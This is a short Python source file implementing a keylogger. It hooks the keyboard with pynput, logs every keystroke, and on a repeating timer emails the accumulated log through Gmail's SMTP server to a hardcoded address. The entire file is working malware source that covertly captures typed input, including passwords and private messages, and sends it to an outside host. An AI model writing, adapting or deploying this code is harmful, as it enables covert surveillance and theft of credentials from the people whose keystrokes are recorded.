#!/usr/bin/env python3
import pynput.keyboard as pkb
import threading 
import smtplib, ssl

class Keylogger:
    
    def __init__(self, time_interval, password, email_from = "akyeba@gmail.com", email_to = "akyeba@gmail.com"):
       self.log = "Keylogger Started"
       self.time_interval = time_interval
       self.password = password
       self.email_from = email_from 
       self.email_to = email_to

    def append_to_log(self, string):
        self.log = self.log + string
    
    def process_key_press(self, key):
        try:
            current_key = str(key.char)
            
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def report(self):
        print(self.log)
        self.send_mail(self.password, "\n\n"+self.log, self.email_from, self.email_to)
        self.log = ""
        timer = threading.Timer(self.time_interval, self.report)
        timer.start()
    
    def send_mail(self, password, message, email_from, email_to):
        context = ssl.create_default_context()
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls(context=context)
            server.login(email_from, password)
            server.sendmail(email_from, email_to, message)
        except Exception as e:
            print(e)
        finally:
            server.quit()

    def start(self):
        key_board_listiner = pkb.Listener(on_press=self.process_key_press)

        with key_board_listiner:
            self.report()
            key_board_listiner.join()